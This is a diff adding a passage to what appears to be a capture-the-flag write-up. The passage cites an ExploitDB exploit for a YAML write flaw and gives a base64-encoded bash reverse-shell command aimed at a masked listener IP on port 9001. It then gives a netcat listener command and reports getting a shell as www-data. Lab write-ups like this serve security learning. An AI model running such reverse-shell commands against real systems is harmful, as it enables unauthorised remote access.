@@ -87,7 +87,19 @@ We can try researching known exploits to gain a foothold on the machine.
 
 # Service Enumeration 
 
+On ExploitDB we can find a validated exploit for arbitrary YAML write/update exploits that will allow us to gain direct access to the target IP. 
 
+exploitDB link -> https://www.exploit-db.com/exploits/49973
+
+In order for the exploit to run properly, we need to input the correct value for the target IP into the code and generate a base64 payload for the reverse shell:
+
+	echo -ne "bash -i >& /dev/tcp/192.XXX.XXX.XXX/9001 0>&1" | base64 -w0
+
+When running the exploit we set up a netcat listener to catch the reverse shell as we wait for the inputted command to run:
+
+		nc -lvnp 9001
+
+With success, we get a remore shell and are logged in as the user, "www-data"
 
 # Privilege Escalation
 
